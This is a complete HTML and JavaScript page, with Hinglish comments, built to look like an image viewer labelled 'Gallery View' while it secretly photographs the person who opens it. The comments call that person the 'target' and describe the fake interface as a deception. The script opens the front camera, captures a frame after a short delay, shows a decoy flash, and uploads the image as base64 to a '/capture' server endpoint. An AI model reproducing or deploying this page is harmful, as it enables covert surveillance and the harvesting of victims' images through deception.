<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Image Viewer</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            overflow: hidden;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        /* Ye video feed hai jo target ko dikhega */
        #videoFeed {
            width: 100vw;
            height: 100vh;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }

        /* Ye hidden canvas hai jo photo capture karega */
        #canvas {
            display: none;
        }

        /* Loading/Status text */
        #status {
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.6);
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            z-index: 10;
            pointer-events: none;
        }

        /* Fake UI taaki target ko lage ki ye normal image viewer hai */
        .ui-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 5;
            pointer-events: none; /* Taki click par koi rukawat na ho */
        }
        
        .top-bar {
            height: 40px;
            background: linear-gradient(to bottom, rgba(0,0,0,0.5), transparent);
            display: flex;
            align-items: center;
            padding-left: 15px;
            color: white;
            font-weight: bold;
        }

        .bottom-bar {
            height: 60px;
            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Blinking effect for realism */
        .flash {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            opacity: 0;
            z-index: 20;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <!-- Video Feed -->
    <video id="videoFeed" autoplay playsinline muted></video>
    
    <!-- Hidden Canvas for Capture -->
    <canvas id="canvas"></canvas>

    <!-- Fake UI -->
    <div class="ui-overlay">
        <div class="top-bar">Gallery View</div>
        <div class="bottom-bar">
            <span style="color:white; font-size:14px;">Tap to expand</span>
        </div>
    </div>

    <!-- Status Indicator -->
    <div id="status">Initializing Camera...</div>

    <!-- Flash Effect -->
    <div class="flash" id="flash"></div>

    <script>
        // Backend URL (Render ya Netlify ka URL)
        // Agar aap Netlify use kar rahe hain toh ye same domain se hi call hoga
        const API_ENDPOINT = '/capture'; 

        const video = document.getElementById('videoFeed');
        const canvas = document.getElementById('canvas');
        const statusText = document.getElementById('status');
        const flashDiv = document.getElementById('flash');

        async function init() {
            try {
                // Vivo Y400 ke liye Front Camera (user) aur High Quality
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: "user", // Front Camera
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });

                video.srcObject = stream;
                
                // Jab video load ho jaye
                video.onloadedmetadata = () => {
                    statusText.innerText = "Loading...";
                    
                    // 1.5 Second baad photo click karein (Target ko lagega wo bas dekh raha hai)
                    setTimeout(() => {
                        capturePhoto();
                    }, 1500);
                };

            } catch (err) {
                console.error("Camera Error:", err);
                statusText.innerText = "Camera Access Needed";
            }
        }

        async function capturePhoto() {
            statusText.innerText = "Capturing...";
            
            // Canvas size set karein video ke hisaab se
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Flash effect dikhayein taaki target ko lage photo click hui hai
            flashDiv.style.opacity = "1";
            setTimeout(() => {
                flashDiv.style.opacity = "0";
            }, 200);

            // Image ko Base64 format mein convert karein
            const dataURL = canvas.toDataURL('image/jpeg', 0.8); // 0.8 quality for balance

            // Server par bhejein
            try {
                await fetch(API_ENDPOINT, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ imageData: dataURL })
                });
                
                statusText.innerText = "Sent!";
                // Thoda ruk kar page ko reset ya close karein
                setTimeout(() => {
                   // Optional: Page ko refresh karein taaki wo wapas normal lage
                   // window.location.reload(); 
                }, 1000);

            } catch (error) {
                console.error("Upload Error:", error);
                statusText.innerText = "Error";
            }
        }

        // Start process
        init();
    </script>
</body>
</html>
